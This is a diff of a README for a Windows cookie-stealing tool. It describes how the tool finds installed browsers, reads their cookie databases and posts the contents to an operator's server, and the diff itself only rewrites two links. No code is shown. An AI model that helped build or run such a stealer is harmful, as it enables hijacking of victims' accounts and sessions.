@@ -3,7 +3,7 @@ Complete raw cookie stealer for MS Windows. Educational purpose only. Have runti
 
 Working principe just pretty simple: first checks what browsers are currently installed on the local machine. There is only four variants for now *(Firefox, Chrome, Opera, Yandex)*, then reads their cookie file databases and sends content to your server through API requests. Really simple, huh.
 
-If you want to build your own binary, click ![here](https://github.com/vulpes-solis/cguilt#build). You also you need a serverside to accept incoming POST requests with some query params in it. To check the template of imcoming params, click ![here](https://github.com/vulpes-solis/cguilt#query-template).
+If you want to build your own binary, click ![here](#build). You also you need a serverside to accept incoming POST requests with some query params in it. To check the template of imcoming params, click ![here](#query-template).
 
 ## query template
 In incoming API requests query schema has three parametrs:
